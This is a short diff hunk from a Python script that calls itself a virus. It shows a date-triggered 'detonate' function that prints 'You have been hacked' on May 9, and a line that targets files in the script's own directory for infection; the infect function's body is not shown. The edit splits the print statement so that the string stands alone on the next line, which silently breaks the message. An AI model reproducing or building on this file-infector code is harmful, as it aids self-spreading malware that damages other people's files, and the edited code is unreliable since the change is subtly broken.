@@ -68,7 +68,8 @@ def infect(files_targeted):
 def detonate():
     #If the current month is May and the current day is the 9th, execute a print statement.
     if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
-        print "You have been hacked"
+        print 
+        "You have been hacked"
 
 #Start with targeting files in the current directory of the virus script.
 files_targeted = locate(os.path.abspath(""))
